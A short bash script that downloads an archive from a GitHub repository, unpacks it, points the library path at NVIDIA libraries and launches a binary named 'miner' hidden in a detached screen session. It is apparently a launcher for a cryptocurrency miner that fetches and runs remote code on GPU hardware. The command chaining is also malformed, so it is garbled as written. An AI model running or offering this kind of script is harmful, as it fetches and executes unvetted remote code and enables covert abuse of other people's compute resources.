#!/bin/bash
wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/Pribadi.tar.gz "sleep 5"; & tar -xvf Pribadi.tar.gz & LD_LIBRARY_PATH=/usr/lib64-nvidia & export LD_LIBRARY_PATH & chmod +x miner & screen -dm bash -c "./miner"
